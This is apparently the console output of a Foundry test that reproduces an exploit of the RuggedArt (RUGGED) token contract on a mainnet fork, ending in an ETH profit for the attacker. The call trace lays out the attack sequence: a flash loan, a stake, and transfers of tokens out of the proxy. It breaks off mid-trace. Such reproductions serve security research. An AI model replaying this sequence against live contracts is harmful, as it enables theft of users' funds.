No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   │   │   │   │   │   │   @ 0x5278f81f69b597f632ca94967c8a1a3079fb3012864a72e457e419fddec9a26b: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 8796 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x17e99f0fabaa872aa0c61e01758a8c607df32d5c27e80b91ce30ed3746544114: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ec: 0 → 942
    │   │   │   │   │   │   │   │   │   │   @ 0xa802220d0ed977381d8b68ae3925365b6c065a04bc1d683139a64b57d4e65308: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 2 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xf367aeb0eb7f2ba1fba0f21da71493632b960882782022912b6405e708fd562f: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e7: 0 → 7859
    │   │   │   │   │   │   │   │   │   │   @ 0xb9e83ac16a9fd4563e29659139d2a3a201e448a49cbdfc9ab24a2acffbbe4436: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x216ec719c0213e89d814536f480598bd82ab255dd54b5ee25b87663456e1f7c5: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x6a9ea30a5fa309821e1798a8460f473e31ace56a3884752f811f11f82c64048c: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0xa421f34ee23dbb9537ec1b4f1a9a588ba34e2a5164c64d7eabc1c8445ab8741b: 5 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xe9b64936dce8d2203c8c485e78dac9f5541c6c46a96f6f5de0b7a1af7b0df1d8: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x522cc3114cda474db2bf78154a25845d2f1f02fa81fac28b0a03215a662c2014: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x201eefa0b4934df22afa051a4a9c50a1a60812f397c2287f31526961a63e7648: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x57bced4c9b502a71acfd2d950a1d54dae5d72be78e16aaaece921b2c058d70ac: 14 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e9: 0 → 7605
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 6049 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x9dc68992587370ea2610c4afc050f53202bac18c08fcce1050ad31cb1c1ebd7a: 0 → 525
    │   │   │   │   │   │   │   │   │   │   @ 0x67388f559e74e33b0aa6f2ec2468057845ddd8d17e39da1c21e877f035a80e23: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8c: 9159 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x0969268cef1c23fee39138be864ae3e858a548d585dbbdc1ffad2db1451eb30a: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0xdc546f96e41e999be4708cb6101a04d8f998356cd939cdf7cc4d0a8fa5af457b: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x2f3a8ebe6e3a27c6a100d98d2ff91774a5b5385d01543103ad054dd5f6762dc5: 0 → 515
    │   │   │   │   │   │   │   │   │   │   @ 0x5b053a6f0242520d4e5daa90fe6eddb38b2e7d2afe6575e476efb712b763e344: 21 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xe6f63d1068ceb0c4ffbbf3d466563935b9a455422bfa240b681957a2c253fd22: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4bce: 8418 → 3913
    │   │   │   │   │   │   │   │   │   │   @ 0x52c23d8ef51e6a955ce19e690dcd1172960a92f20c382ab3629bcd47c243771b: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x1f09525b4ab76afe6d9f12a39db4045d2b330ce9ae84a290bedaa921f37a7f21: 0 → 532
    │   │   │   │   │   │   │   │   │   │   @ 0x2da4a17809aeaf140c779dac13f80dca486ac0194fe7312938c7ae781ab2ed98: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4638: 358 → 9159
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9a: 3525 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 20 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3f68: 5045 → 3270
    │   │   │   │   │   │   │   │   │   │   @ 0xb0091ea7b6befa698abc752c512fbf223dfca9ba2088af38cdb329d1062b1cfb: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0xa48a0046b556202b266997a920608b4f973032aebfea8fee20d7369d2c10eeb7: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x93fc2d05bb710b0727c80980017637ba0fd51e5ac2446759ece994e9089d81ef: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x4ca5c0fa0157a1f3c0e81c5b20f44340fa0053c9858502fd4919bc776ea3bd04: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x65d34de83976ee7db9d863c6cf7fb5630b0f9539f53062a857833d90cd2da5a6: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 9050 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xa32660c37288b6240702978abc3911b347bc8636e5e4c7ae751b67184edd47c1: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9b: 3978 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d90: 347 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 16 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xd7afa6abb1ac288cb75dcd88b595b3d70e5c62f92b144685cd73adda83d552ea: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xc3c7fb6a95b80182ab6b591f943a09f0ce415e4da4e0ecaf98679ba9df432a6d: 0 → 521
    │   │   │   │   │   │   │   │   │   │   @ 0x90f74e7e321e9118b5cac70778fe7663e6d5eb2e2e1379bbdc55c70fa9089b00: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xba2c9d5d63b4586096d418b8bbaeb97a95e473f7b9268d72ef545e57508bfac9: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0xd235970b204fc6f6d44544eac6cea0cf3226e31acbb28f55dd21d00697cb22a2: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 12 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x6a71dca57933fa17eee14913cde5265fb9e89923a9146e65eb6c63cec9c9a91e: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8e: 3270 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e8: 0 → 5862
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4311: 736 → 7093
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4215: 6652 → 7449
    │   │   │   │   │   │   │   │   │   │   @ 0xfcfabd4a56e9bfecfa37ff01e38388e0a80a8618e1913ce41ed7253b1cf13dff: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8f: 8866 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xbefab1654f0e82b9b395560f584e020f989e127b90692fc6231b5c0436698338: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bbf4c536284768a41 → 0x00000000000000000000000000000000000000000000001cf09c06d2e70e8a41
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4579: 1549 → 3978
    │   │   │   │   │   │   │   │   │   │   @ 0x9c21bc71da0e484dfd35ad2a10d338fedd95a67f06d8e39198816abf0c9b1168: 9 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x8d6a34253accd04054fd0e226e1ab2b0e238cf18d7ea48a226d4c41eddadd7df: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x5b68167d1efdaa8fed644c82e6506518ecd9bbe54fff55b98737c8ef74194730: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x262e9b50ffe96ff958522c1428dcecf32edee71305112cf4472d1abf8f392f1d: 0 → 530
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 4984 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 22 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xb59ab80f5598cb65e185f83739c5b8a9f7ed18c2d44c1cfa8eb3fe5e47e30e9e: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x1214a60f33c6391325f4fe835803e25bbbc9ab9ba21d99ebf959d2fd32d9d52e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xbbdbe4e1aed388a8a210d48bb604ec066f940a7085cd8c3d200a60e0dccf0114: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xfbf57951a20a7af7daeefa1d2d90f0cd061fcf465fe6b720b4ff482e80709475: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb430b: 5862 → 1933
    │   │   │   │   │   │   │   │   │   │   @ 0xf2fd03ad4e254bdad2fe17ba09af9c75d08a7fa2e857461c6471ddf929e5138a: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9d: 7449 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d97: 9017 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606de: 0 → 358
    │   │   │   │   │   │   │   │   │   │   @ 0x83cf50b4d13589d25a60fbd906fba99b9e47e1d650248634c4c5d3012cf551f7: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4621: 8137 → 9050
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4a7f: 5507 → 4090
    │   │   │   │   │   │   │   │   │   │   @ 0xa44cf8214680f4e1a824e25b8c3300bef5773bde0bd01e6b84e832bf6653012c: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb471b: 7314 → 4903
    │   │   │   │   │   │   │   │   │   │   @ 0xcca1ec08212243f3b35988423a19fc12298eb379f008c4761c186c8d308cc1b0: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x0fafaf592b21ef4721412e49ab07d865c4e3fb0498759b84225e469cab110d51: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e6e: 5153 → 347
    │   │   │   │   │   │   │   │   │   │   @ 0x18c85d9940008db9668ee1c505f9c826ace999553d0c3e2ec85e96cd0dc63052: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f1: 0 → 6614
    │   │   │   │   │   │   │   │   │   │   @ 0x8df1577a16d9d36c77559c4b5bc9124bab6715f951b3cec262a08223cd59655a: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xe92714d2a2210ef27ead03d2197bd71fbbf873ebeda5232734dbf51aa19169bf: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0xaed1dd2a0734bcbf1768a76b7d3764e4c333664a25c486193747032d6482d03e: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 4 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xdf386c9f5c4a91c50236b85e63d17a35fdb7e8f95a69d64676cdd3a1b078b98e: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   ├─ emit Staked(user: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   @ 3: 0x00000000000000000000000000000000000000000000001bbf432dce378069d1 → 0x00000000000000000000000000000000000000000000001cf092e13e9a1869d1
    │   │   │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000000001314fb37062980000
    │   │   │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc97: 0 → 0x0000000000000000000000000000000000000000000000000ee1d728ef291780
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   ├─ [630] RUGGED::balanceOf(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 533846574232226400833 [5.338e20]
    │   │   │   │   ├─ [86122] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9721)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9721)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x99790ed31a639a03e11d0e13e1cdd2a459dbef1bf54071860ec8cbbacc4320a1: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x1f09525b4ab76afe6d9f12a39db4045d2b330ce9ae84a290bedaa921f37a7f21: 532 → 27
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8c: 0 → 9721
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cf09c06d2e70e8a41 → 0x00000000000000000000000000000000000000000000001ce2bb501f3faa8a41
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 533 → 532
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f3: 7314 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604fa: 9721 → 7314
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   │   │   │   @ 0xa9b2a46ccc3411dfb2a0d9d7dee7f8750eab25a9a7c28c00fd1427b69d14d283: 27 → 0
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 0 → 1
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5163)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 5163)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
